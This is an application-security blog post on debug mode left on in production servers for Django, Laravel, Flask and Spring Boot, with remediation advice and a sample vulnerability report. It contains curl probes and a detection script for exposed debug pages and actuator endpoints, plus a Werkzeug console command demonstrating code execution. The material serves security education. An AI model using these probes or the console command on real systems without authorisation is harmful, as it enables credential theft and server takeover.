# Debug Mode in Production: Dev Left the Lights On. Attackers Walk Straight In.

**Severity:** HIGH | **Category:** Fingerprinting | **Series:** #300DaysWithAppSec

---

## The One Config Line That Breaks Everything

`DEBUG = True`. `APP_DEBUG=true`. `debug: true`. One config line left from development that turns a production server into an open book.

Debug mode was designed for local development — it shows developers detailed error info. In production, it shows attackers detailed error info. And unlike a developer sitting at their desk, an attacker will use every bit of it.

---

## How to Detect Debug Mode

```bash
# Trigger a 404 or 500 and check what comes back
curl -s https://target.com/thispagedoesnotexist-xyz | \
    grep -iE "debug|traceback|exception|django|laravel|flask|settings"

# Django debug page: yellow background + "Django" branding + full stack
# Laravel Ignition: blue/dark UI with "Ignition" branding  
# Flask Werkzeug: grey debug console
# Spring Boot: "Whitelabel Error Page" with version
```

---

## Framework-Specific Debug Exposures

### Django — Most Dangerous Information Leak

```python
# Django debug page reveals FULL settings.py:
SECRET_KEY = 'django-insecure-k#5h...'     # forge session cookies
DATABASES = {
    'default': {
        'HOST': 'db.internal.target.com',   # internal DB host
        'USER': 'django_prod',
        'PASSWORD': 'P@ssw0rd2024!'         # DB password
    }
}

# Trigger: visit any URL that doesn't exist or sends bad data
# Every request variable is dumped — including auth tokens in headers
```

### Laravel — .env on Every Error

```bash
# Ignition debug page leaks:
APP_KEY=base64:abc123xyz=     # forge encrypted cookies → auth bypass
DB_PASSWORD=production_pass   # direct DB access
MAIL_PASSWORD=smtp_password   # email server access
AWS_SECRET_ACCESS_KEY=xxxxx   # AWS credentials

# Trigger: malformed POST body or visiting debug routes
curl -X POST https://target.com/api/users \
    -H "Content-Type: application/json" -d "notjson"
```

### Flask — CRITICAL: Interactive Shell = RCE

```bash
# Flask with debug=True and Werkzeug debugger
# Exposes an interactive Python console at /console on error pages
# ANY visitor can execute Python code — no authentication

# Trigger:
curl https://target.com/error

# If Werkzeug console visible:
# Type in browser console: __import__('os').popen('id').read()
# Returns: uid=33(www-data) gid=33(www-data)
# CRITICAL: Full RCE on the server
```

### Spring Boot Actuator

```bash
# Spring Boot with actuator + management endpoints exposed
curl https://target.com/actuator/env
# Returns ALL environment variables including:
# DATABASE_URL, API_KEY, SPRING_DATASOURCE_PASSWORD

curl https://target.com/actuator/health  # server health status
curl https://target.com/actuator/beans   # all Spring beans
curl https://target.com/actuator/mappings # all routes

# Check if actuator is exposed:
for endpoint in env health beans mappings configprops heapdump; do
    curl -sk https://target.com/actuator/$endpoint | python3 -m json.tool 2>/dev/null | head -5
done
```

---

## Detection Checklist

```bash
#!/bin/bash
TARGET="${1:-https://target.com}"

echo "=== Debug Mode Detection ==="

# Test 1: 404 page
curl -s "$TARGET/xyznonexistent$(date +%s)" | \
    grep -iq "debug\|traceback\|exception\|stack" && \
    echo "[!] Stack trace on 404"

# Test 2: Laravel Ignition
curl -s "$TARGET/xyznonexistent" | \
    grep -iq "ignition\|laravel\|APP_DEBUG" && \
    echo "[!] Laravel debug page detected"

# Test 3: Django debug
curl -s "$TARGET/xyznonexistent" | \
    grep -iq "django\|settings\.py\|SECRET_KEY" && \
    echo "[!] Django debug mode ON"

# Test 4: Flask/Werkzeug console
curl -s "$TARGET/xyznonexistent" | \
    grep -iq "werkzeug\|interactive\|console" && \
    echo "[CRITICAL] Flask debug console detected"

# Test 5: Spring Boot Actuator
curl -sk "$TARGET/actuator/env" | \
    grep -q "propertySources\|systemEnvironment" && \
    echo "[!] Spring Boot Actuator /env exposed"
```

---

## The Report

```
Title: Debug Mode Enabled in Production — Full Application Settings Exposed

Severity: HIGH (information disclosure) → CRITICAL (if Flask shell accessible)

Description:
The application is running in debug mode on the production server.
Accessing any non-existent URL returns a full debug error page
exposing complete application settings including database credentials
and secret keys.

Evidence:
Request: GET https://target.com/nonexistent-page
Response: [Django debug page showing]:
- SECRET_KEY: django-insecure-xxx (redacted)
- DB HOST: db.internal.target.com (internal network address)
- DB PASSWORD: [REDACTED - confirmed present in response]

Impact:
1. Database credentials allow direct database access
2. SECRET_KEY allows forging Django session cookies → full auth bypass
3. Internal IP addresses reveal network topology for SSRF attacks

Remediation:
Set DEBUG = False in Django settings.py
Configure ALLOWED_HOSTS for production
Use django.views.defaults.server_error for custom 500 pages
```

---

## Key Takeaways

```
1. Debug mode = developer tool left ON in production accidentally
2. Django: full settings.py on every 404 → SECRET_KEY + DB creds
3. Laravel: Ignition page → .env contents including all credentials
4. Flask: Werkzeug interactive shell → direct RCE if accessible
5. Spring Boot: /actuator/env → all environment variables
6. Detect: curl any nonexistent URL + grep for debug/traceback
7. Flask debug = CRITICAL immediately — RCE via interactive console
8. Fix: one config line — DEBUG=False / APP_DEBUG=false in prod
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect:** [LinkedIn](https://linkedin.com/in/anand-prajapati-7a265a369) · [GitHub](https://github.com/anand87794) · [Portfolio](https://anandprajapati.lovable.app) · [X @anand87794](https://x.com/anand87794)

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
